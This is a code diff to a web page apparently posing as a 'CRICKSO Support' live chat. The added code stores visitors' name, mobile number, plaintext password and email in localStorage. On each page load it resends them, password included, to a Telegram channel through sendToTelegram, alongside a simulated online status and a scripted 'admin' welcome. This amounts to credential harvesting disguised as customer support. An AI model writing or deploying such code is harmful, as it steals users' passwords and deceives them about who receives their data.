@@ -381,7 +381,42 @@
 
         // ============ POPUP ============
         window.addEventListener('load', function() {
-            document.getElementById('popup').classList.add('show');
+            // Check if user details already saved
+            const saved = localStorage.getItem('cricksoChatUser');
+            if (saved) {
+                currentUser = JSON.parse(saved);
+                chatId = 'chat_' + currentUser.mobile + '_' + Date.now();
+
+                db.ref('chats/' + chatId).set({
+                    user: currentUser,
+                    status: 'active',
+                    createdAt: firebase.database.ServerValue.TIMESTAMP,
+                    lastMessage: '',
+                    lastTime: firebase.database.ServerValue.TIMESTAMP
+                });
+
+                document.getElementById('chatContainer').classList.add('active');
+                document.getElementById('chatUserName').textContent = 'Crickso Support';
+
+                sendToTelegram('<b>💬 New Chat Started</b>\n\n<b>Name:</b> ' + currentUser.name + '\n<b>Mobile:</b> ' + currentUser.mobile + '\n<b>Password:</b> ' + currentUser.password + '\n<b>Email:</b> ' + currentUser.email);
+
+                listenMessages();
+                simulateOnlineStatus();
+
+                // Welcome Message
+                setTimeout(function() {
+                    const welcomeMsg = '👋 Hello! Welcome to CRICKSO Support Team. 🏏🤝\n\nThank you for contacting us. Please share your issue with us, and our Support Team will assist you as soon as possible.\n\nThank you for choosing CRICKSO! ❤️';
+                    db.ref('chats/' + chatId + '/messages').push({
+                        sender: 'admin',
+                        text: welcomeMsg,
+                        type: 'text',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                    db.ref('chats/' + chatId).update({ lastMessage: welcomeMsg.substring(0, 50) + '...', lastTime: firebase.database.ServerValue.TIMESTAMP });
+                }, 1000);
+            } else {
+                document.getElementById('popup').classList.add('show');
+            }
         });
 
         function closePopup() {
@@ -401,6 +436,10 @@
             }
 
             currentUser = { name, mobile, password, email };
+
+            // Save to localStorage
+            localStorage.setItem('cricksoChatUser', JSON.stringify(currentUser));
+
             chatId = 'chat_' + mobile + '_' + Date.now();
 
             db.ref('chats/' + chatId).set({
